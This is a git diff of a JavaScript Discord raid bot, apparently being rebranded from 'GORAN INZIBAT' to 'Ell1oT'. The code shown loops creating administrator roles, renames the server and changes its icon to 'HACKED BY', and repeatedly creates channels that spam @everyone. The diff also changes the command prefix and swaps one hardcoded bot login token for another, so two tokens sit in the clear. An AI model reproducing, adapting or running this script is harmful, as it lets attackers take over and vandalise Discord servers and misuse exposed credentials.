@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = 'b?'///lera ba dly xot prefix dabne
+const prefix = '.'///lera ba dly xot prefix dabne
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -27,7 +27,7 @@ client.on('message', message => {
       
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED BY GORAN INZIBAT",
+                name: "HACKED BY Ell1oT",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -37,12 +37,12 @@ client.on('message', message => {
         
         message.guild.setIcon("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
         client.user.setAvatar("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
-        message.guild.setName('HACKED BY GORAN INZIBAT');
+        message.guild.setName('HACKED BY Ell1oT');
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY GORAN INZIBAT', 'text').then(channel => { 
-                channel.send('@everyone HACK BY GORAN INZIBAT BCHO SERVER DABNEWA:joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY Ell1oT', 'text').then(channel => { 
+                channel.send('@everyone HACKED BY Ell1oT BCHO SERVER DABNEWA:joy: :joy: :joy:')
                
                 })
             }                        
@@ -97,5 +97,5 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("NzQwODY1MDY1MjU0NjQ5OTY3.XyvOXA.2oj-icUrmmJAaOxlvsfEDIJ_wIo")
+client.login("ODEyMjYzODU2Njk2ODUyNTIx.YC-Nqg.BclcZP-hyPezGA5GU9_6lNkXWa4")
           
